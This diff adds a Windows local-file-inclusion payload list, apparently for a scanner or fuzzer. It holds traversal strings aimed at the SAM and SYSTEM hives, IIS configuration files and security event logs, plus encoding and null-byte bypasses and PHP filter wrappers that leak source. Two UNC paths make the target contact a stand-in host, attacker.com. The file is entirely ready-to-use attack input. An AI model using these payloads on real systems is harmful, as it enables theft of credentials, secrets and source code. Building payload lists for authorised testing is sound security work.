@@ -1,0 +1,26 @@
+# LFI Windows — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+../../../../windows/win.ini
+../../../../windows/system32/drivers/etc/hosts
+# ── Advanced — sensitive files ─────────────────────────────────────────────
+../../../../windows/system32/config/sam
+../../../../windows/system32/config/system
+../../../../windows/repair/sam
+../../../../boot.ini
+../../../../inetpub/wwwroot/web.config
+../../../../windows/system32/inetsrv/config/applicationHost.config
+# ── Advanced — encoding bypasses ──────────────────────────────────────────
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+....\\....\\....\\....\\windows\\win.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+# ── Advanced — null byte ───────────────────────────────────────────────────
+../../../../windows/win.ini%00
+# ── Advanced — IIS/event logs ─────────────────────────────────────────────
+../../../../inetpub/logs/LogFiles/
+../../../../windows/system32/winevt/logs/security.evtx
+# ── Advanced — PHP wrappers ────────────────────────────────────────────────
+php://filter/read=convert.base64-encode/resource=../../../../windows/win.ini
+php://filter/read=convert.base64-encode/resource=index.php
+# ── Advanced — UNC path ────────────────────────────────────────────────────
+\\\\attacker.com\\share\\file
+//attacker.com/share/file
